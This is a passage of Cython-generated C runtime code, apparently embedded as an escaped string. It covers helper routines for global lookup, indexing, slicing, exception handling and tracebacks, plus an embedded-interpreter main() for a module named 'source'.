__Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\n        return 0;\n    return obj_dict_version == __Pyx_get_object_dict_version(obj);\n}\n#endif\n\n/* GetModuleGlobalName */\n#if CYTHON_USE_DICT_VERSIONS\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\n#else\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\n#endif\n{\n    PyObject *result;\n#if !CYTHON_AVOID_BORROWED_REFS\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1\n    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    } else if (unlikely(PyErr_Occurred())) {\n        return NULL;\n    }\n#else\n    result = PyDict_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n#endif\n#else\n    result = PyObject_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n    PyErr_Clear();\n#endif\n    return __Pyx_GetBuiltinName(name);\n}\n\n/* GetItemInt */\nstatic PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {\n    PyObject *r;\n    if (!j) return NULL;\n    r = PyObject_GetItem(o, j);\n    Py_DECREF(j);\n    return r;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,\n                                                              CYTHON_NCP_UNUSED i""nt wraparound,\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n    Py_ssize_t wrapped_i = i;\n    if (wraparound & unlikely(i < 0)) {\n        wrapped_i += PyList_GET_SIZE(o);\n    }\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {\n        PyObject *r = PyList_GET_ITEM(o, wrapped_i);\n        Py_INCREF(r);\n        return r;\n    }\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\n#else\n    return PySequence_GetItem(o, i);\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,\n                                                              CYTHON_NCP_UNUSED int wraparound,\n                                                              CYTHON_NCP_UNUSED int boundscheck) {\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n    Py_ssize_t wrapped_i = i;\n    if (wraparound & unlikely(i < 0)) {\n        wrapped_i += PyTuple_GET_SIZE(o);\n    }\n    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {\n        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);\n        Py_INCREF(r);\n        return r;\n    }\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\n#else\n    return PySequence_GetItem(o, i);\n#endif\n}\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,\n                                                     CYTHON_NCP_UNUSED int wraparound,\n                                                     CYTHON_NCP_UNUSED int boundscheck) {\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS\n    if (is_list || PyList_CheckExact(o)) {\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);\n        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {\n            PyObject *r = Py""List_GET_ITEM(o, n);\n            Py_INCREF(r);\n            return r;\n        }\n    }\n    else if (PyTuple_CheckExact(o)) {\n        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);\n        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {\n            PyObject *r = PyTuple_GET_ITEM(o, n);\n            Py_INCREF(r);\n            return r;\n        }\n    } else {\n        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;\n        if (likely(m && m->sq_item)) {\n            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {\n                Py_ssize_t l = m->sq_length(o);\n                if (likely(l >= 0)) {\n                    i += l;\n                } else {\n                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))\n                        return NULL;\n                    PyErr_Clear();\n                }\n            }\n            return m->sq_item(o, i);\n        }\n    }\n#else\n    if (is_list || PySequence_Check(o)) {\n        return PySequence_GetItem(o, i);\n    }\n#endif\n    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));\n}\n\n/* SliceObject */\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,\n        Py_ssize_t cstart, Py_ssize_t cstop,\n        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,\n        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {\n#if CYTHON_USE_TYPE_SLOTS\n    PyMappingMethods* mp;\n#if PY_MAJOR_VERSION < 3\n    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;\n    if (likely(ms && ms->sq_slice)) {\n        if (!has_cstart) {\n            if (_py_start && (*_py_start != Py_None)) {\n                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);\n                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\n            } else\n                cstart = 0;\n        }\n        if (!has_cstop) {\n            if (_py_stop && (*_py_stop != Py_None)) {\n              ""  cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);\n                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\n            } else\n                cstop = PY_SSIZE_T_MAX;\n        }\n        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {\n            Py_ssize_t l = ms->sq_length(obj);\n            if (likely(l >= 0)) {\n                if (cstop < 0) {\n                    cstop += l;\n                    if (cstop < 0) cstop = 0;\n                }\n                if (cstart < 0) {\n                    cstart += l;\n                    if (cstart < 0) cstart = 0;\n                }\n            } else {\n                if (!PyErr_ExceptionMatches(PyExc_OverflowError))\n                    goto bad;\n                PyErr_Clear();\n            }\n        }\n        return ms->sq_slice(obj, cstart, cstop);\n    }\n#endif\n    mp = Py_TYPE(obj)->tp_as_mapping;\n    if (likely(mp && mp->mp_subscript))\n#endif\n    {\n        PyObject* result;\n        PyObject *py_slice, *py_start, *py_stop;\n        if (_py_slice) {\n            py_slice = *_py_slice;\n        } else {\n            PyObject* owned_start = NULL;\n            PyObject* owned_stop = NULL;\n            if (_py_start) {\n                py_start = *_py_start;\n            } else {\n                if (has_cstart) {\n                    owned_start = py_start = PyInt_FromSsize_t(cstart);\n                    if (unlikely(!py_start)) goto bad;\n                } else\n                    py_start = Py_None;\n            }\n            if (_py_stop) {\n                py_stop = *_py_stop;\n            } else {\n                if (has_cstop) {\n                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);\n                    if (unlikely(!py_stop)) {\n                        Py_XDECREF(owned_start);\n                        goto bad;\n                    }\n                } else\n                    py_stop = Py_None;\n            }\n            py_""slice = PySlice_New(py_start, py_stop, Py_None);\n            Py_XDECREF(owned_start);\n            Py_XDECREF(owned_stop);\n            if (unlikely(!py_slice)) goto bad;\n        }\n#if CYTHON_USE_TYPE_SLOTS\n        result = mp->mp_subscript(obj, py_slice);\n#else\n        result = PyObject_GetItem(obj, py_slice);\n#endif\n        if (!_py_slice) {\n            Py_DECREF(py_slice);\n        }\n        return result;\n    }\n    PyErr_Format(PyExc_TypeError,\n        \"'%.200s' object is unsliceable\", Py_TYPE(obj)->tp_name);\nbad:\n    return NULL;\n}\n\n/* PyObjectCallNoArg */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {\n#if CYTHON_FAST_PYCALL\n    if (PyFunction_Check(func)) {\n        return __Pyx_PyFunction_FastCall(func, NULL, 0);\n    }\n#endif\n#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)\n    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))\n#else\n    if (likely(PyCFunction_Check(func)))\n#endif\n    {\n        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {\n            return __Pyx_PyObject_CallMethO(func, NULL);\n        }\n    }\n    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);\n}\n#endif\n\n/* GetTopmostException */\n#if CYTHON_USE_EXC_INFO_STACK\nstatic _PyErr_StackItem *\n__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)\n{\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&\n           exc_info->previous_item != NULL)\n    {\n        exc_info = exc_info->previous_item;\n    }\n    return exc_info;\n}\n#endif\n\n/* SaveResetException */\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n    #if CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);\n    *type = exc_info->exc_type;\n    *value = exc_info->ex""c_value;\n    *tb = exc_info->exc_traceback;\n    #else\n    *type = tstate->exc_type;\n    *value = tstate->exc_value;\n    *tb = tstate->exc_traceback;\n    #endif\n    Py_XINCREF(*type);\n    Py_XINCREF(*value);\n    Py_XINCREF(*tb);\n}\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    #if CYTHON_USE_EXC_INFO_STACK\n    _PyErr_StackItem *exc_info = tstate->exc_info;\n    tmp_type = exc_info->exc_type;\n    tmp_value = exc_info->exc_value;\n    tmp_tb = exc_info->exc_traceback;\n    exc_info->exc_type = type;\n    exc_info->exc_value = value;\n    exc_info->exc_traceback = tb;\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = type;\n    tstate->exc_value = value;\n    tstate->exc_traceback = tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n}\n#endif\n\n/* GetException */\n#if CYTHON_FAST_THREAD_STATE\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)\n#endif\n{\n    PyObject *local_type, *local_value, *local_tb;\n#if CYTHON_FAST_THREAD_STATE\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    local_type = tstate->curexc_type;\n    local_value = tstate->curexc_value;\n    local_tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n#else\n    PyErr_Fetch(&local_type, &local_value, &local_tb);\n#endif\n    PyErr_NormalizeException(&local_type, &local_value, &local_tb);\n#if CYTHON_FAST_THREAD_STATE\n    if (unlikely(tstate->curexc_type))\n#else\n    if (unlikely(PyErr_Occurred()))\n#endif\n        goto bad;\n    #if PY_MAJOR_VERSION >= 3\n    if (local_tb) {\n        if (unlikely(PyException_SetTrac""eback(local_value, local_tb) < 0))\n            goto bad;\n    }\n    #endif\n    Py_XINCREF(local_tb);\n    Py_XINCREF(local_type);\n    Py_XINCREF(local_value);\n    *type = local_type;\n    *value = local_value;\n    *tb = local_tb;\n#if CYTHON_FAST_THREAD_STATE\n    #if CYTHON_USE_EXC_INFO_STACK\n    {\n        _PyErr_StackItem *exc_info = tstate->exc_info;\n        tmp_type = exc_info->exc_type;\n        tmp_value = exc_info->exc_value;\n        tmp_tb = exc_info->exc_traceback;\n        exc_info->exc_type = local_type;\n        exc_info->exc_value = local_value;\n        exc_info->exc_traceback = local_tb;\n    }\n    #else\n    tmp_type = tstate->exc_type;\n    tmp_value = tstate->exc_value;\n    tmp_tb = tstate->exc_traceback;\n    tstate->exc_type = local_type;\n    tstate->exc_value = local_value;\n    tstate->exc_traceback = local_tb;\n    #endif\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n#else\n    PyErr_SetExcInfo(local_type, local_value, local_tb);\n#endif\n    return 0;\nbad:\n    *type = 0;\n    *value = 0;\n    *tb = 0;\n    Py_XDECREF(local_type);\n    Py_XDECREF(local_value);\n    Py_XDECREF(local_tb);\n    return -1;\n}\n\n/* PyErrFetchRestore */\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    tmp_type = tstate->curexc_type;\n    tmp_value = tstate->curexc_value;\n    tmp_tb = tstate->curexc_traceback;\n    tstate->curexc_type = type;\n    tstate->curexc_value = value;\n    tstate->curexc_traceback = tb;\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n}\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n    *type = tstate->curexc_type;\n    *value = tstate->curexc_value;\n    *tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->c""urexc_value = 0;\n    tstate->curexc_traceback = 0;\n}\n#endif\n\n/* CLineInTraceback */\n#ifndef CYTHON_CLINE_IN_TRACEBACK\nstatic int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {\n    PyObject *use_cline;\n    PyObject *ptype, *pvalue, *ptraceback;\n#if CYTHON_COMPILING_IN_CPYTHON\n    PyObject **cython_runtime_dict;\n#endif\n    if (unlikely(!__pyx_cython_runtime)) {\n        return c_line;\n    }\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n#if CYTHON_COMPILING_IN_CPYTHON\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);\n    if (likely(cython_runtime_dict)) {\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\n            use_cline, *cython_runtime_dict,\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))\n    } else\n#endif\n    {\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);\n      if (use_cline_obj) {\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\n        Py_DECREF(use_cline_obj);\n      } else {\n        PyErr_Clear();\n        use_cline = NULL;\n      }\n    }\n    if (!use_cline) {\n        c_line = 0;\n        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);\n    }\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {\n        c_line = 0;\n    }\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n    return c_line;\n}\n#endif\n\n/* CodeObjectCache */\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\n    int start = 0, mid = 0, end = count - 1;\n    if (end >= 0 && code_line > entries[end].code_line) {\n        return count;\n    }\n    while (start < end) {\n        mid = start + (end - start) / 2;\n        if (code_line < entries[mid].code_line) {\n            end = mid;\n        } else if (code_line > entries[mid].c""ode_line) {\n             start = mid + 1;\n        } else {\n            return mid;\n        }\n    }\n    if (code_line <= entries[mid].code_line) {\n        return mid;\n    } else {\n        return mid + 1;\n    }\n}\nstatic PyCodeObject *__pyx_find_code_object(int code_line) {\n    PyCodeObject* code_object;\n    int pos;\n    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {\n        return NULL;\n    }\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\n    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {\n        return NULL;\n    }\n    code_object = __pyx_code_cache.entries[pos].code_object;\n    Py_INCREF(code_object);\n    return code_object;\n}\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {\n    int pos, i;\n    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;\n    if (unlikely(!code_line)) {\n        return;\n    }\n    if (unlikely(!entries)) {\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\n        if (likely(entries)) {\n            __pyx_code_cache.entries = entries;\n            __pyx_code_cache.max_count = 64;\n            __pyx_code_cache.count = 1;\n            entries[0].code_line = code_line;\n            entries[0].code_object = code_object;\n            Py_INCREF(code_object);\n        }\n        return;\n    }\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\n    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {\n        PyCodeObject* tmp = entries[pos].code_object;\n        entries[pos].code_object = code_object;\n        Py_DECREF(tmp);\n        return;\n    }\n    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {\n        int new_max = __pyx_code_cache.max_count + 64;\n        entries = (__Pyx_C""odeObjectCacheEntry*)PyMem_Realloc(\n            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\n        if (unlikely(!entries)) {\n            return;\n        }\n        __pyx_code_cache.entries = entries;\n        __pyx_code_cache.max_count = new_max;\n    }\n    for (i=__pyx_code_cache.count; i>pos; i--) {\n        entries[i] = entries[i-1];\n    }\n    entries[pos].code_line = code_line;\n    entries[pos].code_object = code_object;\n    __pyx_code_cache.count++;\n    Py_INCREF(code_object);\n}\n\n/* AddTraceback */\n#include \"compile.h\"\n#include \"frameobject.h\"\n#include \"traceback.h\"\n#if PY_VERSION_HEX >= 0x030b00a6\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include \"internal/pycore_frame.h\"\n#endif\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\n            const char *funcname, int c_line,\n            int py_line, const char *filename) {\n    PyCodeObject *py_code = NULL;\n    PyObject *py_funcname = NULL;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_srcfile = NULL;\n    py_srcfile = PyString_FromString(filename);\n    if (!py_srcfile) goto bad;\n    #endif\n    if (c_line) {\n        #if PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromFormat( \"%s (%s:%d)\", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        #else\n        py_funcname = PyUnicode_FromFormat( \"%s (%s:%d)\", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        funcname = PyUnicode_AsUTF8(py_funcname);\n        if (!funcname) goto bad;\n        #endif\n    }\n    else {\n        #if PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromString(funcname);\n        if (!py_funcname) goto bad;\n        #endif\n    }\n    #if PY_MAJOR_VERSION < 3\n    py_code = __Pyx_PyCode_New(\n        0,\n        0,\n        0,\n        0,\n        0,\n        __pyx_empty_bytes, /*PyObject *code,*/\n        __pyx_empty_tuple, /*PyObject *consts,*/\n        __p""yx_empty_tuple, /*PyObject *names,*/\n        __pyx_empty_tuple, /*PyObject *varnames,*/\n        __pyx_empty_tuple, /*PyObject *freevars,*/\n        __pyx_empty_tuple, /*PyObject *cellvars,*/\n        py_srcfile,   /*PyObject *filename,*/\n        py_funcname,  /*PyObject *name,*/\n        py_line,\n        __pyx_empty_bytes  /*PyObject *lnotab*/\n    );\n    Py_DECREF(py_srcfile);\n    #else\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\n    #endif\n    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline\n    return py_code;\nbad:\n    Py_XDECREF(py_funcname);\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_srcfile);\n    #endif\n    return NULL;\n}\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename) {\n    PyCodeObject *py_code = 0;\n    PyFrameObject *py_frame = 0;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject *ptype, *pvalue, *ptraceback;\n    if (c_line) {\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\n    }\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\n    if (!py_code) {\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n        py_code = __Pyx_CreateCodeObjectForTraceback(\n            funcname, c_line, py_line, filename);\n        if (!py_code) {\n            /* If the code object creation fails, then we should clear the\n               fetched exception references and propagate the new exception */\n            Py_XDECREF(ptype);\n            Py_XDECREF(pvalue);\n            Py_XDECREF(ptraceback);\n            goto bad;\n        }\n        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\n        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);\n    }\n    py_frame = PyFrame_New(\n        tstate,            /*PyThreadState *tstate,*/\n        py_code,           /*PyCodeObject *code,*/\n        __pyx_d,    /*PyObject *globals,*/\n     ""   0                  /*PyObject *locals*/\n    );\n    if (!py_frame) goto bad;\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\n    PyTraceBack_Here(py_frame);\nbad:\n    Py_XDECREF(py_code);\n    Py_XDECREF(py_frame);\n}\n\n/* MainFunction */\n#ifdef __FreeBSD__\n#include <floatingpoint.h>\n#endif\n#if PY_MAJOR_VERSION < 3\nint main(int argc, char** argv) {\n#elif defined(WIN32) || defined(MS_WINDOWS)\nint wmain(int argc, wchar_t **argv) {\n#else\nstatic int __Pyx_main(int argc, wchar_t **argv) {\n#endif\n    /* 754 requires that FP exceptions run in \"no stop\" mode by default,\n     * and until C vendors implement C99's ways to control FP exceptions,\n     * Python requires non-stop mode.  Alas, some platforms enable FP\n     * exceptions by default.  Here we disable them.\n     */\n#ifdef __FreeBSD__\n    fp_except_t m;\n    m = fpgetmask();\n    fpsetmask(m & ~FP_X_OFL);\n#endif\n    if (argc && argv)\n        Py_SetProgramName(argv[0]);\n    Py_Initialize();\n    if (argc && argv)\n        PySys_SetArgv(argc, argv);\n    {\n      PyObject* m = NULL;\n      __pyx_module_is_main_source = 1;\n      #if PY_MAJOR_VERSION < 3\n          initsource();\n      #elif CYTHON_PEP489_MULTI_PHASE_INIT\n          m = PyInit_source();\n          if (!PyModule_Check(m)) {\n              PyModuleDef *mdef = (PyModuleDef *) m;\n              PyObject *modname = PyUnicode_FromString(\"__main__\");\n              m = NULL;\n              if (modname) {\n                  m = PyModule_NewObject(modname);\n                  Py_DECREF(modname);\n                  if (m) PyModule_ExecDef(m, mdef);\n              }\n          }\n      #else\n          m = PyInit_source();\n      #endif\n      if (PyErr_Occurred()) {\n          PyErr_Print();\n          #if PY_MAJOR_VERSION < 3\n          if (Py_FlushLine()) PyErr_Clear();\n          #endif\n          return 1;\n      }\n      Py_XDECREF(m);\n    }\n#if PY_VERSION_HEX < 0x03060000\n    Py_Finalize();\n#else\n    if (Py_FinalizeEx""() < 0)\n        return 2;\n#endif\n    return 0;\n}\n#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)\n#include <locale.h>\nstatic wchar_t*\n__Pyx_char2wchar(char* arg)\n{\n    wchar_t *res;\n#ifdef HAVE_BROKEN_MBSTOWCS\n    /* Some platforms have a broken implementation of\n     * mbstowcs which does not count the characters that\n     * would result from conversion.  Use an upper bound.\n     */\n    size_t argsize = strlen(arg);\n#else\n    size_t argsize = mbstowcs(NULL, arg, 0);\n#endif\n    size_t count;\n    unsigned char *in;\n    wchar_t *out;\n#ifdef HAVE_MBRTOWC\n    mbstate_t mbs;\n#endif\n    if (argsize != (size_t)-1) {\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\n        if (!res)\n            goto oom;\n        count = mbstowcs(res, arg, argsize+1);\n        if (count != (size_t)-1) {\n            wchar_t *tmp;\n            /* Only use the result if it contains no\n               surrogate characters. */\n            for (tmp = res; *tmp != 0 &&\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\n                ;\n            if (*tmp == 0)\n                return res;\n        }\n        free(res);\n    }\n#ifdef HAVE_MBRTOWC\n    /* Overallocate; as multi-byte characters are in the argument, the\n       actual output could use less memory. */\n    argsize = strlen(arg) + 1;\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    memset(&mbs, 0, sizeof mbs);\n    while (argsize) {\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\n        if (converted == 0)\n            break;\n        if (converted == (size_t)-2) {\n            /* Incomplete character. This should never happen,\n               since we provide everything that we have -\n               unless there is a bug in the C library, or I\n               misunderstood how mbrtowc works. */\n            fprintf(stderr, \"unexpected mbrtowc result ""-2\\\\n\");\n            free(res);\n            return NULL;\n        }\n        if (converted == (size_t)-1) {\n            /* Conversion error. Escape as UTF-8b, and start over\n               in the initial shift state. */\n            *out++ = 0xdc00 + *in++;\n            argsize--;\n            memset(&mbs, 0, sizeof mbs);\n            continue;\n        }\n        if (*out >= 0xd800 && *out <= 0xdfff) {\n            /* Surrogate character.  Escape the original\n               byte sequence with surrogateescape. */\n            argsize -= converted;\n            while (converted--)\n                *out++ = 0xdc00 + *in++;\n            continue;\n        }\n        in += converted;\n        argsize -= converted;\n        out++;\n    }\n#else\n    /* Cannot use C locale for escaping; manually escape as if charset\n       is ASCII (i.e. escape all bytes > 128. This will still roundtrip\n       correctly in the locale's charset, which must be an ASCII superset. */\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    while(*in)\n        if(*in < 128)\n            *out++ = *in++;\n        else\n            *out++ = 0xdc00 + *in++;\n    *out = 0;\n#endif\n    return res;\noom:\n    fprintf(stderr, \"out of memory\\\\n\");\n    return NULL;\n}\nint\nmain(int argc, char **argv)\n{\n    if (!argc) {\n        return __Pyx_main(0, NULL);\n    }\n    else {\n        int i, res;\n        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        char *oldloc = strdup(setlocale(LC_ALL, NULL));\n        if (!argv_copy || !argv_copy2 || !oldloc) {\n            fprintf(stderr, \"out of memory\\\\n\");\n            free(argv_copy);\n            free(argv_copy2);\n            free(oldloc);\n            return 1;\n        }\n        res = 0;\n        setlocale(LC_ALL, \"\");\n        for (i = 0; i < argc; ""i++) {\n            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);\n            if (!argv_copy[i]) res = 1;\n        }\n        setlocale(LC_ALL, oldloc);\n        free(oldloc);\n        if (res == 0)\n            res = __Pyx_main(argc, argv_copy);\n        for (i = 0; i < argc; i++) {\n#if PY_VERSION_HEX < 0x03050000\n            free(argv_copy2[i]);\n#else\n            PyMem_RawFree(argv_copy2[i]);\n#endif\n        }\n        free(argv_copy);\n        free(argv_copy2);\n        return res;\n    }\n}\n#endif\n\n/* CIntToPy */\n    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wconversion\"\n#endif\n    const long neg_one = (long) -1, const_zero = (long) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (is_unsigned) {\n        if (sizeof(long) < sizeof(long)) {\n            return PyInt_FromLong((long) value);\n        } else if (sizeof(long) <= sizeof(unsigned long)) {\n            return PyLong_FromUnsignedLong((unsigned long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {\n            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);\n#endif\n        }\n    } else {\n        if (sizeof(long) <= sizeof(long)) {\n            return PyInt_FromLong((long) value);\n#ifdef HAVE_LONG_LONG\n        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {\n            return PyLong_FromLongLong((PY_LONG_LONG) value);\n#endif\n        }\n    }\n    {\n        int one = 1; int little = (int)*(unsigned char *)&one;\n        unsigned char *bytes = (unsigned char *)&value;\n        return _PyLong_FromByteArray(bytes, sizeof(long),\n                                     little, !is_unsigned);\n    }\n}\n\n/* CIntFromPyVerify */\n    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\\\n    __""PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)\n#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\\\n    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)\n#define 